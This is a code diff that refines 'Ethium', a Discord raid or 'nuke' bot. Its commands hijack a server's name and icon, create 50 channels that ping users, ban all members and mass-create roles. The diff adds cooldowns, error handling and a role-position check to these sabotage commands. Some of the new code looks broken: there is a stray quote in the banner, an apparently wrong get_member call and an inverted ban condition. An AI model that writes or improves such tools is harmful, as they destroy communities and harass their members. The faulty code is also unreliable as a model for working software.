@@ -30,7 +30,7 @@ async def banner() -> None:
 
     :return: None.
     '''
-    BANNER: str = '''
+    BANNER: str = ''''
 ▄███▄     ▄▄▄▄▀ ▄  █ ▄█   ▄   █▀▄▀█ 
 █▀   ▀ ▀▀▀ █   █   █ ██    █  █ █ █ 
 ██▄▄       █   ██▀▀█ ██ █   █ █ ▄ █ 
@@ -94,7 +94,9 @@ async def on_command(ctx: cmds.Context) -> None:
 
 
 @ethium.event
-async def on_command_error(_, exception: Union[cmds.CommandError, Exception]) -> None:
+async def on_command_error(
+    ctx: cmds.Context, exception: Union[cmds.CommandError, Exception]
+) -> None:
     '''
     The on_command_error function is a coroutine that is called when an error occurs while invoking a command.
     The event name is on_command_error.
@@ -106,6 +108,11 @@ async def on_command_error(_, exception: Union[cmds.CommandError, Exception]) ->
     :return: None.
     '''
     exception = getattr(exception, 'original', exception)
+    if isinstance(exception, cmds.CommandOnCooldown):
+        try:
+            await ctx.send(f'> {ctx.author.mention} command has cooldown, try after.')
+        except Exception as e:
+            log.error(f'An error occurred while sending the message {e}')
     log.error(exception)
 
 
@@ -171,8 +178,9 @@ async def nuke(ctx: cmds.Context) -> None:
 
 
 @ethium.command(
-    description='This command will allow you to create 50 channels with undefined ping on each channel (it is recommended to execute this command only once).'
+    description='This command will allow you to create 50 channels with undefined ping on each channel (cooldown of 10 min).'
 )
+@cmds.cooldown(1, 600)
 async def raid(ctx: cmds.Context) -> None:
     '''
     The raid function is a command that will change the server name and icon to
@@ -184,6 +192,10 @@ async def raid(ctx: cmds.Context) -> None:
     :return: None.
     '''
     guild: discord.Guild = ctx.guild
+
+    if ICON_URL is None:
+        raise ValueError('Empty icon url')
+
     _response: httpx.Response = httpx.get(ICON_URL)
     guild_icon: bytes = _response.content
     await guild.edit(name=SERVER_NAME, icon=guild_icon)
@@ -211,6 +223,12 @@ async def mass_ban(ctx: cmds.Context) -> None:
     for member in [
         member for member in guild.members if not member in (ctx.author, ethium.user)
     ]:
+
+        bot_member = await ethium.get_member(ethium.user.id)
+
+        if member.top_role.position < bot_member.top_role.position:
+            continue
+
         await guild.ban(member)
         log.info(f'Executed member {member}')
 
@@ -279,14 +297,14 @@ async def del_roles(ctx: cmds.Context) -> None:
 
 
 @ethium.command(
-    name='createroles',
+    name='mkroles',
     description='This command will create the number of roles that are missing to reach 250 roles (the maximum).',
 )
-async def create_roles(ctx: cmds.Context) -> None:
+async def make_roles(ctx: cmds.Context) -> None:
     '''
-    The create_roles function creates 250 roles in the guild.
+    The make_roles function creates 250 roles in the guild.
 
-    The create_roles function is used to create 250 roles in the guild, which are then used by the bot to assign a role for each user that joins. The name of these roles is 'User'. This function should only be called once per server, as it will not check if there are already enough roles created before creating more.
+    The make_roles function is used to create 250 roles in the guild, which are then used by the bot to assign a role for each user that joins. The name of these roles is 'User'. This function should only be called once per server, as it will not check if there are already enough roles created before creating more.
 
     :param ctx:cmds.Context: Used to Get the guild from the context.
     :return: None.
@@ -311,7 +329,7 @@ async def help(ctx: cmds.Context) -> None:
     '''
     author: Union[discord.User, discord.Member] = ctx.author
     _dev: discord.User = await ethium.fetch_user(843511119033401394)
-    embed = discord.Embed(
+    embed: discord.Embed = discord.Embed(
         title='Ethium | Commands',
         description=f'Below is a list of my available **commands**.\n> My prefix is: **{ethium.command_prefix}**',
         color=0x000,
